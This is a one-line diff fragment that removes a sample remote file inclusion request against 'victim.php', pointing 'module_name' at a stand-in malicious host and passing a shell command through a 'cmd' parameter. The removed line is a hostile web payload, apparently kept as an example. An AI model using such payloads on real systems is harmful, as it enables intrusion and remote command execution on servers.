@@ -1,1 +1,0 @@
--victim.php?module_name=http://malicious.example.com&cmd=/bin/ls%20-l
